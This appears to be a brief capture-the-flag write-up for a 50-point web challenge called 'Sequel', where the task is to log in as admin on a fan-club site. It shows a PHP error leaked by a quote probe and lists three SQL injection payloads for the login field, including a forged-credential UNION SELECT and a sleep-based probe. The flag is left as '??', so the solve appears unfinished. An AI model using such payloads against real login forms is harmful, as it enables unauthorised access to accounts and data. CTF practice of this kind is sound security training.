# Sequel
web - 50 points

## Challenge 
I found what looks like a [Star Wars sequel fan club](http://web2.angstromctf.com:2345/), but I believe the admin user is up to something more nefarious. Can you log in with the admin account and check it out?

## Hint
Maybe it's vulnerable to some sort of injection?

## Solution

Input `'` into username field

	Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in /root/problems/web/sequel/deploy/source/public/index.php on line 5

Try out

	' OR 1 = 0; UNION SELECT 'admin' AS username, '123456' AS password FROM users LIMIT 1;#

	d" or 1=1;--

	" union select sleep(5),"admin"

## Flag

	??